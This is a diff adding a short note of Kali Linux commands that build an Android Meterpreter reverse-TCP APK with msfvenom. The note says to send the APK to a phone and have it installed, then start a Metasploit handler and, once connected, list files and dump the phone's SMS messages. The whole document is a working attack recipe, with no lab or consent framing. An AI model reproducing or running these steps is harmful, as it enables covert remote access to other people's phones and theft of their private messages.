@@ -1,1 +1,17 @@
+open kali linux terminal
+#ifconfig -> note the IP (inet = IP)
+#msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o name.apk
+send to android and install it
+#msfconsole
+#use exploit/multi/handler
+#set payload android/meterpreter/reverse_tcp
+#set LHOST IP
+#set LPORT 4444
+#show option
+#exploit
+#sysinfo
+#help*
+#ls*
+#dump_sms
 
+...
